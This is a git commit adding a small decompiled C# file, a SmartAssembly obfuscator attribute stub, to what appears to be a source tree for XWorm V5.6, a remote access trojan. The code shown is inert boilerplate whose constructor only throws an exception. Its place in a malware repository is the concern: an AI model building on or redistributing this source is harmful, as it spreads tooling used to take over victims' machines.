96a84f7f304cb965df4cfb63724c86322d00f911
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:53:02 +0400

    PoweredByAttribute.cs

---
+++ XWorm V5.6/Server/Properties/PoweredByAttribute.cs
@@ -0,0 +1,9 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+internal class SmartAssembly\u002EAttributes\u002EPoweredByAttribute : Attribute
+{
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  public SmartAssembly\u002EAttributes\u002EPoweredByAttribute([In] string obj0) => throw new Exception("つ");
+}
